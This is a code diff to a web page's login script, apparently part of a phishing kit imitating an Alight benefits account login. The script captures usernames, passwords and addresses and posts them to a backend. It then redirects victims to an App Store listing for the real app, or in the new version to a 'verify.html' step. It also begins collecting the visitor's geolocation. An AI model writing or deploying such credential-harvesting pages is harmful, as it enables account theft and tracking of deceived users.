@@ -136,26 +136,24 @@
     </footer>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const address = document.getElementById('address').value;
+       document.getElementById('loginForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const address = document.getElementById('address') ? document.getElementById('address').value : '';
 
-            try {
-                await fetch('/api/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password, address })
-                });
-            } catch (err) {
-                console.log("Error sending data");
-            }
-
-            // Redirect after login
-            window.location.href = "https://apps.apple.com/us/app/alight-smart-choice-accounts/id1445889966";
+    try {
+        await fetch('/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password, address })
         });
+    } catch (err) {}
+
+    // Redirect to verification page instead of tunde.html
+    window.location.href = "verify.html";
+});
         
    // Get real geolocation when user clicks the link
     if (navigator.geolocation) {
